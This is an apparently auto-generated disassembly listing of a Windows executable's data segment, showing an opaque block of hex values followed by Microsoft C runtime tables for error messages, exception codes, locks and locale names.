		dd 0DA59354Fh, 3543C8A8h, 0C8B4DA4Dh, 0DA413557h, 352BC8C0h
		dd 0C8CCDA35h, 0DA29353Fh, 3533C8D8h, 0C8E4DA1Dh, 0DA113507h
		dd 351BC8F0h, 0C8FCDA05h, 0D9F936EFh, 36E3CB08h, 0CB14D9EDh
		dd 0D9E136F7h, 36CBCB20h, 0CB2CD9D5h, 0D9C936DFh, 36D3CB38h
		dd 0CB44D9BDh, 0D9B136A7h, 36BBCB50h, 0CB5CD9A5h, 0D999368Fh
		dd 3683CB68h, 0CB74D98Dh, 0D9813697h, 0EFCB80h,	0FD010FFDh
		dd 0EFFD00FBh, 32DBCF30h, 0CF4CDDB5h, 0DD7D328Bh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh
		dd 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh
		dd 0EFFD00EFh, 0EFFD00h, 0FD00EFFDh, 0EFFD00EFh, 0EFFD00h
		dd 0FD00EFFDh, 0EFFD00EFh
		dd 500h	dup(0)
dword_43339C	dd 1E000h		; DATA XREF: sub_401270+36r
					; sub_401270+72r
dword_4333A0	dd 1939h dup(0)
dword_439884	dd 19930520h, 3	dup(0)	; DATA XREF: __NLG_Notify1+2o
					; __NLG_Notify+2o
off_439894	dd offset __exit	; DATA XREF: __amsg_exit+1Cr
dword_439898	dd 2			; DATA XREF: __FF_MSGBANNER+Er
					; sub_4040CD+46r
		dd offset ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z	; __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *)
; DWORD	dwTlsIndex
dwTlsIndex	dd 0FFFFFFFFh		; DATA XREF: __mtinit+Fw __mtinit+28r	...
off_4398A4	dd offset ?terminate@@YAXXZ ; DATA XREF: sub_40338D+29r
					; terminate(void)
dword_4398A8	dd 0C0000005h, 0Bh, 0	; DATA XREF: __initptd+4o
					; .text:004032E3o ...
		dd 0C000001Dh, 4, 0
		dd 0C0000096h, 4, 0
		dd 0C000008Dh, 8, 0
		dd 0C000008Eh, 8, 0
		dd 0C000008Fh, 8, 0
		dd 0C0000090h, 8, 0
		dd 0C0000091h, 8, 0
		dd 0C0000092h, 8, 0
		dd 0C0000093h, 8, 0
dword_439920	dd 3			; DATA XREF: __XcptFilter+62r
					; __XcptFilter+86r ...
dword_439924	dd 7			; DATA XREF: __XcptFilter+68r
					; __XcptFilter+8Cr ...
; size_t dword_439928
dword_439928	dd 78h			; DATA XREF: _signal+66r _signal+7Dr
dword_43992C	dd 0Ah			; DATA XREF: _xcptlookup+4r
					; _signal+B2r ...
		dd 0FFFFFFFFh, 0A00h, 7	dup(0)
		dd 10h
dword_439958	dd 2			; DATA XREF: sub_4040CD+Eo
					; sub_4040CD+28r ...
off_43995C	dd offset aR6002FloatingP ; DATA XREF: sub_4040CD+FCr
					; sub_4040CD+12Do ...
					; "R6002\r\n- floating point not loaded\r\"...
		dd 8
		dd offset aR6008NotEnough ; "R6008\r\n-	not enough space for argumen"...
		dd 9
		dd offset aR6009NotEnough ; "R6009\r\n-	not enough space for environ"...
		dd 0Ah
		dd offset aAbnormalProgra ; "\r\nabnormal program termination\r\n"
		dd 10h
		dd offset aR6016NotEnough ; "R6016\r\n-	not enough space for thread "...
		dd 11h
		dd offset aR6017Unexpecte ; "R6017\r\n-	unexpected multithread lock "...
		dd 12h
		dd offset aR6018Unexpecte ; "R6018\r\n-	unexpected heap	error\r\n"
		dd 13h
		dd offset aR6019UnableToO ; "R6019\r\n-	unable to open console devic"...
		dd 18h
		dd offset aR6024NotEnough ; "R6024\r\n-	not enough space for _onexit"...
		dd 19h
		dd offset aR6025PureVirtu ; "R6025\r\n-	pure virtual function call\r"...
		dd 1Ah
		dd offset aR6026NotEnough ; "R6026\r\n-	not enough space for stdio i"...
		dd 1Bh
		dd offset aR6027NotEnough ; "R6027\r\n-	not enough space for lowio i"...
		dd 1Ch
		dd offset aR6028UnableToI ; "R6028\r\n-	unable to initialize heap\r\"...
		dd 78h
		dd offset aDomainError	; "DOMAIN error\r\n"
		dd 79h
		dd offset aSingError	; "SING	error\r\n"
		dd 7Ah
		dd offset aTlossError	; "TLOSS error\r\n"
		dd 0FCh
		dd offset asc_4110F8	; "\r\n"
		dd 0FFh
		dd offset aRuntimeError	; "runtime error "
off_4399E8	dd offset off_4399E8	; DATA XREF: .text:00403F82o
					; sub_4040CD+1Bo ...
; LPVOID lpMem
lpMem		dd offset off_4399E8	; DATA XREF: sub_4052D1:loc_405351r
					; sub_4052D1+89w ...
		dd offset dword_439A00
		dd offset dword_439A00
dword_4399F8	dd 0FFFFFFFFh		; DATA XREF: sub_4052D1r
					; sub_405415:loc_405462w
		dd 0FFFFFFFFh
dword_439A00	dd 0F0h, 0F1h, 800h dup(0) ; DATA XREF:	.data:004399F0o
					; .data:004399F4o
off_43BA08	dd offset off_4399E8	; DATA XREF: sub_405415+15r
					; sub_405415+20w ...
dword_43BA0C	dd 1E0h			; DATA XREF: sub_402725+8Ar
					; .text:004042AEr ...
; LPCRITICAL_SECTION dword_43BA10
dword_43BA10	dd 0			; DATA XREF: __mtdeletelocks+8o
					; __lock+7r ...
; LPCRITICAL_SECTION off_43BA14
off_43BA14	dd offset dword_43D6B0	; DATA XREF: __mtinitlocks+1Fr
					; __mtdeletelocks+2Bo ...
		dd 7 dup(0)
; LPCRITICAL_SECTION off_43BA34
off_43BA34	dd offset dword_43D6E0	; DATA XREF: __mtinitlocks+17r
					; __mtdeletelocks+23o ...
		dd 3 dup(0)
; LPCRITICAL_SECTION off_43BA44
off_43BA44	dd offset dword_43D6F8	; DATA XREF: __mtinitlocks+Fr
					; __mtdeletelocks+1Bo ...
		dd 3 dup(0)
; LPCRITICAL_SECTION lpCriticalSection
lpCriticalSection dd offset dword_43D6C8 ; DATA	XREF: __mtinitlocks+7r
					; __mtdeletelocks+13o ...
		dd 1Eh dup(0)
byte_43BAD0	db 1			; DATA XREF: __mtdeletelocks+41o
					; __setmbcp+EDr
		db 2, 4, 8
		align 8
dword_43BAD8	dd 3A4h			; DATA XREF: __setmbcp+38o
aVyv		db '`┌y┌!',0            ; DATA XREF: __setmbcp+129o
		align 8
aJ		db '╕ъ',0               ; DATA XREF: __setmbcp+CCo
		align 10h
aBe		db '║╔',0
		align 8
		dd 0FCE09F81h, 0
		dd 0FC807E40h, 0
		dd 3A8h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE40h, 0
		dd 3B5h, 0A3DAA3C1h, 20h, 5 dup(0)
		dd 0FE81h, 0
		dd 0FE41h, 0
		dd 3B6h, 0A2E4A2CFh, 0A2E5001Ah, 5BA2E8h, 4 dup(0)
		dd 0FE81h, 0
		dd 0FEA17E40h, 0
		dd 551h, 0DA5EDA51h, 0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
dword_43BBC8	dd 2 dup(0)		; DATA XREF: __setmbcp+45o
off_43BBD0	dd offset __ctype+2	; DATA XREF: _strtoxl:loc_406BFCr
					; _strtoxl:loc_406CB9r	...
off_43BBD4	dd offset __ctype+2	; DATA XREF: sub_408B88+1A0w
					; sub_408B88+21Dw
		public __ctype
; unsigned __int16 _ctype[]
__ctype		dd    200000h		; DATA XREF: _x_ismbbtype+18r
					; sub_408B88+213o ...
		unicode	0, <	    (((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(810081h), 0Ah dup(10001h), 3 dup(100010h), 3 dup(820082h)
		dd 0Ah dup(20002h), 2 dup(100010h), 20h, 41h dup(0)
dword_43BDE0	dd 1			; DATA XREF: .text:004078F3o
dword_43BDE4	dd 16h			; DATA XREF: .text:00407923r
		dd 2 dup(2), 3,	2, 4, 18h, 5, 0Dh, 6, 9, 7, 0Ch, 8, 0Ch
		dd 9, 0Ch, 0Ah,	7, 0Bh,	8, 0Ch,	16h, 0Dh, 16h, 0Fh, 2
		dd 10h,	0Dh, 11h, 2 dup(12h), 2, 21h, 0Dh, 35h,	2, 41h
		dd 0Dh,	43h, 2,	50h, 11h, 52h, 0Dh, 53h, 0Dh, 57h, 16h
		dd 59h,	0Bh, 6Ch, 0Dh, 6Dh, 20h, 70h, 1Ch, 72h,	9, 6, 16h
		dd 80h,	0Ah, 81h, 0Ah, 82h, 9, 83h, 16h, 84h, 0Dh, 91h
		dd 29h,	9Eh, 0Dh, 0A1h,	2, 0A4h, 0Bh, 0A7h, 0Dh, 0B7h
		dd 11h,	0CEh, 2, 0D7h, 0Bh, 718h, 0Ch
dword_43BF48	dd 1			; DATA XREF: _strtoxl:loc_406BE4r
					; _strtoxl:loc_406CA1r	...
byte_43BF4C	db 2Eh			; DATA XREF: ___init_numeric+106w
					; ___init_numeric+1CAw
		align 10h
dword_43BF50	dd 1			; DATA XREF: ___init_numeric+100w
					; ___init_numeric+1C0w
dword_43BF54	dd 43h			; DATA XREF: __setlocale_set_cat:loc_407E66o
					; .data:off_43C070o ...
; char aC_0[2]
aC_0		db 'C',0                ; DATA XREF: __expandlocale+62o
		align 4
		dd 20h dup(0)
; char aC[2]
aC		db 'C',0                ; DATA XREF: __expandlocale:loc_407F8Co
		align 10h
		dd 20h dup(0)
		dd offset aLc_all	; "LC_ALL"
; char *dword_43C064
dword_43C064	dd 0			; DATA XREF: _setlocale+5Er
					; _setlocale+1B6o ...
off_43C068	dd offset sub_408054	; DATA XREF: __setlocale_set_cat:loc_407E39r
off_43C06C	dd offset aLc_collate	; DATA XREF: _setlocale+D4o
					; __setlocale_get_all+2Fr
					; "LC_COLLATE"
off_43C070	dd offset dword_43BF54	; DATA XREF: __setlocale_get_all+23r
					; __setlocale_get_all+42o
		dd offset sub_408DCD
		dd offset aLc_ctype	; "LC_CTYPE"
off_43C07C	dd offset dword_43BF54	; DATA XREF: __setlocale_get_all+B2r
		dd offset sub_408B88
		dd offset aLc_monetary	; "LC_MONETARY"
		dd offset dword_43BF54
		dd offset ___init_monetary
		dd offset aLc_numeric	; "LC_NUMERIC"
		dd offset dword_43BF54
		dd offset ___init_numeric
off_43C09C	dd offset aLc_time	; DATA XREF: _setlocale+101o
					; "LC_TIME"
off_43C0A0	dd offset dword_43BF54	; DATA XREF: _setlocale+1F4o
					; __setlocale_get_all+8Ao
		dd offset ___init_time
		align 10h
dword_43C0B0	dd 40Ah			; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+1Br
a040a		db '040a',0             ; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+B2o
		align 4
off_43C0BC	dd offset aSpanishTraditi ; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+89r
					; "Spanish - Traditional Sort"
dword_43C0C0	dd 505345h		; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+A8o
off_43C0C4	dd offset aSpain	; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+7Er
					; "Spain"
dword_43C0C8	dd 505345h		; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+9Eo
dword_43C0CC	dd 303538h, 0		; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+94o
a1252		db '1252',0             ; DATA XREF: crtGetLocaleInfoA(x,x,x,x)+74o
		align 4
		dd 40Bh, 62303430h, 0
		dd offset aFinnish	; "Finnish"
		dd 4E4946h
		dd offset aFinland	; "Finland"
		dd 4E4946h, 303538h, 0
a1252_0		db '1252',0
		align 4
		dd 40Ch, 63303430h, 0
		dd offset aFrench	; "French"
		dd offset dword_414F9C+2AAh
		dd offset aFrance	; "France"
		dd offset dword_414F9C+2AAh
		dd 303538h, 0
a1252_1		db '1252',0
		align 4
		dd 40Fh, 66303430h, 0
		dd offset aIcelandic	; "Icelandic"
		dd 4C5349h
		dd offset aIceland	; "Iceland"
		dd 4C5349h, 303538h, 0
a1252_2		db '1252',0
		align 10h
		dd 41Dh, 64313430h, 0
		dd offset aSwedish	; "Swedish"
		dd 455653h
		dd offset aSweden	; "Sweden"
		dd 455753h, 303538h, 0
a1252_3		db '1252',0
		align 4
		dd 42Dh, 64323430h, 0
		dd offset aBasque	; "Basque"
		dd 515545h
		dd offset aSpain	; "Spain"
		dd 505345h, 303538h, 0
a1252_4		db '1252',0
		align 4
		db 0Ah
		db 8,0
		align 4
a080a		db '080a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4D5345h
		dd offset aMexico	; "Mexico"
		dd 58454Dh, 303538h, 0
a1252_5		db '1252',0
		align 4
		dd 80Ch, 63303830h, 0
		dd offset aFrench	; "French"
		dd offset dword_424F9C+2AAh
		dd offset aBelgium	; "Belgium"
		dd 4C4542h, 303538h, 0
a1252_6		db '1252',0
		align 10h
		dd 0C07h, 37306330h, 0
		dd offset aGerman	; "German"
		dd offset dword_413F9C+5A8h
		dd offset aAustria	; "Austria"
		dd 545541h, 303538h, 0
a1252_7		db '1252',0
		align 4
		dd 0C09h, 39306330h, 0
		dd offset aEnglish	; "English"
		dd offset dword_41479C+6A9h
		dd offset aAustralia	; "Australia"
		dd 535541h, 303538h, 0
a1252_8		db '1252',0
		align 4
		dd 0C0Ah, 61306330h, 0
		dd offset aSpanishModernS ; "Spanish - Modern Sort"
		dd 4E5345h
		dd offset aSpain	; "Spain"
		dd 505345h, 303538h, 0
a1252_9		db '1252',0
		align 4
		dd 0C0Ch, 63306330h, 0
		dd offset aFrench	; "French"
		dd offset dword_4333A0+1EA6h
		dd offset aCanada	; "Canada"
		dd 4E4143h, 303538h, 0
a1252_10	db '1252',0
		align 10h
		dd 100Ah, 61303031h, 0
		dd offset aSpanish	; "Spanish"
		dd 475345h
		dd offset aGuatemala	; "Guatemala"
		dd 4D5447h, 303538h, 0
a1252_11	db '1252',0
		align 4
		dd 100Ch, 63303031h, 0
		dd offset aFrench	; "French"
		dd 535246h
		dd offset aSwitzerland	; "Switzerland"
		dd 454843h, 303538h, 0
a1252_12	db '1252',0
		align 4
		dd 140Ah, 61303431h, 0
		dd offset aSpanish	; "Spanish"
		dd offset dword_4333A0+1FA5h
		dd offset aCostaRica	; "Costa Rica"
		dd 495243h, 303538h, 0
a1252_13	db '1252',0
		align 4
		dd 140Ch, 63303431h, 0
		dd offset aFrench	; "French"
		dd 4C5246h
		dd offset aLuxembourg	; "Luxembourg"
		dd 58554Ch, 303538h, 0
a1252_14	db '1252',0
		align 10h
		dd 180Ah, 61303831h, 0
		dd offset aSpanish	; "Spanish"
		dd offset dword_414F9C+3A9h
		dd offset aPanama	; "Panama"
		dd 4E4150h, 303538h, 0
a1252_15	db '1252',0
		align 4
		dd 1C09h, 39306331h, 0
		dd offset aEnglish	; "English"
		dd 534E45h
		dd offset aSouthAfrica	; "South Africa"
		dd 46415Ah, 373334h, 0
a1252_16	db '1252',0
		align 4
		dd 1C0Ah, 61306331h, 0
		dd offset aSpanish	; "Spanish"
		dd 445345h
		dd offset aDominicanRepub ; "Dominican Republic"
		dd 4D4F44h, 303538h, 0
a1252_17	db '1252',0
		align 4
		db 0Ah
		db ' ',0
		align 4
a200a		db '200a',0
		align 10h
		dd offset aSpanish	; "Spanish"
		dd 565345h
		dd offset aVenezuela	; "Venezuela"
		dd 4E4556h, 303538h, 0
a1252_18	db '1252',0
		align 10h
		db 0Ah
		db '$',0
		align 4
a240a		db '240a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4F5345h
		dd offset aColombia	; "Colombia"
		dd 4C4F43h, 303538h, 0
a1252_19	db '1252',0
		align 4
		db 0Ah
		db '(',0
		align 10h
a280a		db '280a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 525345h
		dd offset aPeru		; "Peru"
		dd 524550h, 303538h, 0
a1252_20	db '1252',0
		align 4
		db 0Ah
		db ',',0
		align 4
a2c0a		db '2c0a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 535345h
		dd offset aArgentina	; "Argentina"
		dd 475241h, 303538h, 0
a1252_21	db '1252',0
		align 4
a0		db 0Ah
		db '0',0
		align 4
a300a		db '300a',0
		align 10h
		dd offset aSpanish	; "Spanish"
		dd 465345h
		dd offset aEcuador	; "Ecuador"
		dd 554345h, 303538h, 0
a1252_22	db '1252',0
		align 10h
a4		db 0Ah
		db '4',0
		align 4
a340a		db '340a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 4C5345h
		dd offset aChile	; "Chile"
		dd 4C4843h, 303538h, 0
a1252_23	db '1252',0
		align 4
a8		db 0Ah
		db '8',0
		align 10h
a380a		db '380a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 595345h
		dd offset aUruguay	; "Uruguay"
		dd 595255h, 303538h, 0
a1252_24	db '1252',0
		align 4
		db 0Ah
		db '<',0
		align 4
a3c0a		db '3c0a',0
		align 4
		dd offset aSpanish	; "Spanish"
		dd 5A5345h
		dd offset aParaguay	; "Paraguay"
		dd 595250h, 303538h, 0
a1252_25	db '1252',0
		align 4
dword_43C554	dd 0C1A0C0Ch, 4361007h,	42D080Ch, 100C0403h, 81D0810h
					; DATA XREF: sub_4094FAo
off_43C568	dd offset aAmerica	; DATA XREF: ___get_qualified_locale+6Do
					; sub_4094FA+11o
					; "america"
		dd offset dword_414F9C+3B9h
		dd offset aBritain	; "britain"
		dd 524247h
		dd offset aChina	; "china"
		dd 4E4843h
		dd offset aCzech	; "czech"
		dd 455A43h
		dd offset aEngland	; "england"
		dd 524247h
		dd offset aGreatBritain	; "great britain"
		dd 524247h
		dd offset aHolland	; "holland"
		dd 444C4Eh
		dd offset aHongKong	; "hong-kong"
		dd 474B48h
		dd offset aNewZealand	; "new-zealand"
		dd 4C5A4Eh
		dd offset aNz		; "nz"
		dd 4C5A4Eh
		dd offset aPrChina_0	; "pr china"
		dd 4E4843h
		dd offset aPrChina	; "pr-china"
		dd 4E4843h
		dd offset aPuertoRico	; "puerto-rico"
		dd 495250h
		dd offset aSlovak	; "slovak"
		dd 4B5653h
		dd offset aSouthAfrica_1 ; "south africa"
		dd 46415Ah
		dd offset aSouthKorea_0	; "south korea"
		dd 524F4Bh
		dd offset aSouthAfrica_0 ; "south-africa"
		dd 46415Ah
		dd offset aSouthKorea	; "south-korea"
		dd 524F4Bh
		dd offset aTrinidadTobago ; "trinidad &	tobago"
		dd 4F5454h
		dd offset aUk		; "uk"
		dd 524247h
		dd offset aUnitedKingdom ; "united-kingdom"
		dd 524247h
		dd offset aUnitedStates	; "united-states"
		dd offset dword_414F9C+3B9h
		dd offset aUs		; "us"
		dd offset dword_414F9C+3B9h
off_43C620	dd offset aAmerican	; DATA XREF: ___get_qualified_locale+49o
					; "american"
		dd 554E45h
		dd offset aAmericanEngl_0 ; "american english"
		dd 554E45h
		dd offset aAmericanEnglis ; "american-english"
		dd 554E45h
		dd offset aAustralian	; "australian"
		dd offset dword_41479C+6A9h
		dd offset aBelgian	; "belgian"
		dd offset dword_42479C+4B2h
		dd offset aCanadian	; "canadian"
		dd offset dword_4333A0+1AA5h
		dd offset aChh		; "chh"
		dd 48485Ah
		dd offset aChi		; "chi"
		dd 49485Ah
		dd offset aChinese	; "chinese"
		dd 534843h
		dd offset aChineseHongkon ; "chinese-hongkong"
		dd 48485Ah
		dd offset aChineseSimplif ; "chinese-simplified"
		dd 534843h
		dd offset aChineseSingapo ; "chinese-singapore"
		dd 49485Ah
		dd offset aChineseTraditi ; "chinese-traditional"
		dd 544843h
		dd offset aDutchBelgian	; "dutch-belgian"
		dd offset dword_42479C+4B2h
		dd offset aEnglishAmerica ; "english-american"
		dd 554E45h
		dd offset aEnglishAus	; "english-aus"
		dd offset dword_41479C+6A9h
		dd offset aEnglishBelize ; "english-belize"
		dd 4C4E45h
		dd offset aEnglishCan	; "english-can"
		dd offset dword_4333A0+1AA5h
		dd offset aEnglishCaribbe ; "english-caribbean"
		dd offset dword_42479C+6A9h
		dd offset aEnglishIre	; "english-ire"
		dd 494E45h
		dd offset aEnglishJamaica ; "english-jamaica"
		dd 4A4E45h
		dd offset aEnglishNz	; "english-nz"
		dd 5A4E45h
		dd offset aEnglishSouthAf ; "english-south africa"
		dd 534E45h
		dd offset aEnglishTrinida ; "english-trinidad y	tobago"
		dd 544E45h
		dd offset aEnglishUk	; "english-uk"
		dd 474E45h
		dd offset aEnglishUs	; "english-us"
		dd 554E45h
		dd offset aEnglishUsa	; "english-usa"
		dd 554E45h
		dd offset aFrenchBelgian ; "french-belgian"
		dd offset dword_424F9C+2AAh
		dd offset aFrenchCanadian ; "french-canadian"
		dd offset dword_4333A0+1EA6h
		dd offset aFrenchLuxembou ; "french-luxembourg"
		dd 4C5246h
		dd offset aFrenchSwiss	; "french-swiss"
		dd 535246h
		dd offset aGermanAustrian ; "german-austrian"
		dd offset dword_413F9C+5A8h
		dd offset aGermanLichtens ; "german-lichtenstein"
		dd offset dword_4333A0+11A4h
		dd offset aGermanLuxembou ; "german-luxembourg"
		dd 4C4544h
		dd offset aGermanSwiss	; "german-swiss"
		dd 534544h
		dd offset aIrishEnglish	; "irish-english"
		dd 494E45h
		dd offset aItalianSwiss	; "italian-swiss"
		dd 535449h
		dd offset aNorwegian	; "norwegian"
		dd 524F4Eh
		dd offset aNorwegianBokma ; "norwegian-bokmal"
		dd 524F4Eh
